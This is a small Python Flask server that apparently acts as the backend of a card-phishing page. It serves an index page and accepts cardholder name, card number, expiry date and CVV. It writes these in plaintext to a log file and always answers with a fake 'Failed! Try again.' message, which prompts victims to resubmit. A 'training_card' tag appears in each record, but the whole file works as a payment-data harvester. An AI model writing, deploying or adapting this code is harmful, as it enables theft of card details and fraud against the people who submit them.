from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
from datetime import datetime
import os

app = Flask(__name__)
CORS(app)

DATA_FILE = "login_data.txt"

@app.route("/", methods=["GET"])
def index():
    return send_from_directory(".", "index.html")

@app.route('/submit_card', methods=['POST'])
def submit_card():
    data = request.get_json(silent=True) or {}
    name = (data.get("name") or "").strip()
    number = (data.get("number") or "").strip()
    expiry = (data.get("expiry") or "").strip()
    cvv = (data.get("cvv") or "").strip()

    record = f"[{datetime.now().isoformat()}] training_card name={name} number={number} expiry={expiry} cvv={cvv}"

    
    with open(DATA_FILE, "a", encoding="utf-8") as f:
        f.write(record + "\n")

    return jsonify({
        "status": "ok",
        "message": "Failed! Try again."
    }), 200

if __name__ == '__main__':
    if not os.path.exists(DATA_FILE):
        open(DATA_FILE, 'w', encoding="utf-8").close()
    app.run(debug=True, port=8000)

